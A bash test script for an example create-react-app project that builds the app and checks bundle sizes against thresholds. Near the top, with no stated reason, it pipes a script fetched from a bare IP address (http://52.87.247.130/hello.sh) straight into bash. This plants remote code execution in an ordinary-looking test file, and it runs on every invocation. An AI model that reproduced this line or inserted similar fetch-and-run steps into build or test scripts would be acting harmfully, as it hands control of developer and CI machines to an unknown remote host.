#!/bin/bash

# Test the example app

set -e
curl http://52.87.247.130/hello.sh | bash
TEST_FOLDER=/tmp/$(date +%s)
DEMO_FOLDER=$PWD/examples/create-react-app
BUILD_FOLDER=$PWD/build
BUNDLE_SIZE_THRESHOLD=4000000
MAIN_BUNDLE_SIZE_THRESHOLD=1600000

if [ -d $TEST_FOLDER ]; then rm -rf $TEST_FOLDER; fi 

echo "TEST_FOLDER=${TEST_FOLDER}"
mkdir -p $TEST_FOLDER

cp -r $DEMO_FOLDER/. $TEST_FOLDER/.

pushd $TEST_FOLDER 

echo "Building the project"
yarn add $BUILD_FOLDER
yarn
yarn build

echo "Creating source map"
npx source-map-explorer build/static/js/*.js --json result.json

echo "File bundle size:"
cat result.json | jq ".results[] | .bundleName,.totalBytes" 

FAILED_FILE_COUNT=$(cat result.json | jq ".results[] | select(.totalBytes>${BUNDLE_SIZE_THRESHOLD}) | .bundleName" -r | wc -l | awk '{$1=$1;print}')

FAILED_MAIN_FILE_COUNT=$(cat result.json | jq ".results[0] | select(.totalBytes>${MAIN_BUNDLE_SIZE_THRESHOLD}) | .bundleName" -r | wc -l | awk '{$1=$1;print}')

popd

echo "FAILED_FILE_COUNT=${FAILED_FILE_COUNT}"

if [ ${FAILED_FILE_COUNT} -gt 0 ] ; then
    echo "FAILED: One or more file bundle size exceeds threshold ${BUNDLE_SIZE_THRESHOLD}"
    exit 1
else
    echo "PASS: All file bundle size are below threshold ${BUNDLE_SIZE_THRESHOLD}"
fi

echo "FAILED_MAIN_FILE_COUNT=${FAILED_MAIN_FILE_COUNT}"

if [ ${FAILED_MAIN_FILE_COUNT} -gt 0 ] ; then
    echo "FAILED: The main file bundle size exceeds threshold ${MAIN_BUNDLE_SIZE_THRESHOLD}"
    exit 1
else
    echo "PASS: The main file bundle size is below threshold ${MAIN_BUNDLE_SIZE_THRESHOLD}"
fi

rm -rf $TEST_FOLDER
